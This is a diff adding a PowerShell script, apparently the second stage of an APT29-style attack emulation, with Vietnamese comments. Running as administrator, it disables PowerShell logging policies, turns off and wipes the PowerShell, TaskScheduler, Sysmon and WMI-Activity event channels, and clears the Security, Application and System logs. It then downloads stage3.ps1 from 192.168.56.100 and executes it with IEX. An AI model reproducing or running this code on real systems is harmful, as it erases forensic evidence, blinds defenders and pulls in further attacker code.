@@ -1,0 +1,113 @@
+function Invoke-Stage2Main {
+    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    [Net.WebRequest]::DefaultWebProxy = $null
+
+    $PublicDir = "C:\Users\Public\apt29"
+    mkdir $PublicDir -Force -EA SilentlyContinue
+    $LogFile = "$PublicDir\stage2.log"
+    function L($m) { "[$(Get-Date -Format 'HH:mm:ss')] $m" | Out-File $LogFile -Append }
+
+    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    L "STAGE2 START - PID=$PID - Admin=$isAdmin"
+    if (-not $isAdmin) { L "No admin - exit"; return }
+
+    # =========================================================
+    # THU TU DUNG: DISABLE POLICY -> DISABLE CHANNEL -> SLEEP -> CLEAR
+    # =========================================================
+
+    # ===== 1. PowerShell =====
+    L "[1] PowerShell Logging"
+    try {
+        # 1a. Disable policy TRUOC (ngan nguon sinh event)
+        $sbPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
+        if (-not (Test-Path $sbPath)) { New-Item -Path $sbPath -Force | Out-Null }
+        Set-ItemProperty -Path $sbPath -Name "EnableScriptBlockLogging" -Value 0 -Type DWord -Force
+        L "  [1a] Disabled ScriptBlockLogging policy"
+
+        $mlPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
+        if (-not (Test-Path $mlPath)) { New-Item -Path $mlPath -Force | Out-Null }
+        Set-ItemProperty -Path $mlPath -Name "EnableModuleLogging" -Value 0 -Type DWord -Force
+        L "  [1b] Disabled ModuleLogging policy"
+
+        $trPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
+        if (-not (Test-Path $trPath)) { New-Item -Path $trPath -Force | Out-Null }
+        Set-ItemProperty -Path $trPath -Name "EnableTranscripting" -Value 0 -Type DWord -Force
+        L "  [1c] Disabled Transcription policy"
+
+        # 1d. Disable CHANNEL (ngan nhan event)
+        wevtutil sl "Microsoft-Windows-PowerShell/Operational" /e:false 2>&1 | Out-Null
+        L "  [1d] Disabled PowerShell/Operational channel"
+
+        # 1e. SLEEP cho event cu flush
+        Start-Sleep -Seconds 2
+
+        # 1f. Clear records (sau khi channel da tat)
+        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>&1 | Out-Null
+        L "  [1e] Cleared PowerShell/Operational (after disable)"
+    } catch { L "  [FAIL] $_" }
+
+    # ===== 2. TaskScheduler =====
+    L "[2] TaskScheduler Logging"
+    try {
+        # 2a. Disable channel
+        wevtutil sl "Microsoft-Windows-TaskScheduler/Operational" /e:false 2>&1 | Out-Null
+        L "  [2a] Disabled TaskScheduler channel"
+
+        # 2b. Sleep
+        Start-Sleep -Seconds 2
+
+        # 2c. Clear
+        wevtutil cl "Microsoft-Windows-TaskScheduler/Operational" 2>&1 | Out-Null
+        L "  [2b] Cleared TaskScheduler (after disable)"
+    } catch { L "  [FAIL] $_" }
+
+    # ===== 3. Sysmon =====
+    L "[3] Sysmon Logging"
+    try {
+        wevtutil sl "Microsoft-Windows-Sysmon/Operational" /e:false 2>&1 | Out-Null
+        L "  [3a] Disabled Sysmon channel"
+
+        Start-Sleep -Seconds 2
+
+        wevtutil cl "Microsoft-Windows-Sysmon/Operational" 2>&1 | Out-Null
+        L "  [3b] Cleared Sysmon (after disable)"
+    } catch { L "  [FAIL] $_" }
+
+    # ===== 4. WMI-Activity =====
+    L "[4] WMI-Activity Logging"
+    try {
+        wevtutil sl "Microsoft-Windows-WMI-Activity/Operational" /e:false 2>&1 | Out-Null
+        L "  [4a] Disabled WMI-Activity channel"
+
+        Start-Sleep -Seconds 2
+
+        wevtutil cl "Microsoft-Windows-WMI-Activity/Operational" 2>&1 | Out-Null
+        L "  [4b] Cleared WMI-Activity (after disable)"
+    } catch { L "  [FAIL] $_" }
+
+    # ===== 5. Security log (chi clear, khong disable) =====
+    L "[5] Security Log (clear only)"
+    try {
+        wevtutil cl "Security" 2>&1 | Out-Null
+        L "  [OK] Cleared Security log"
+    } catch { L "  [FAIL] $_" }
+
+    # ===== 6. Application + System =====
+    L "[6] Application + System logs"
+    try {
+        wevtutil cl "Application" 2>&1 | Out-Null
+        wevtutil cl "System" 2>&1 | Out-Null
+        L "  [OK] Cleared Application + System"
+    } catch { L "  [FAIL] $_" }
+
+    L "STAGE2 END - Chuyen sang stage3.ps1"
+    Start-Sleep -Seconds 2
+
+    # ===== Tiep tuc voi stage3.ps1 =====
+    $wc = New-Object Net.WebClient
+    $wc.Proxy = $null
+    IEX $wc.DownloadString("https://192.168.56.100:8443/stage3.ps1")
+}
+
+Invoke-Stage2Main
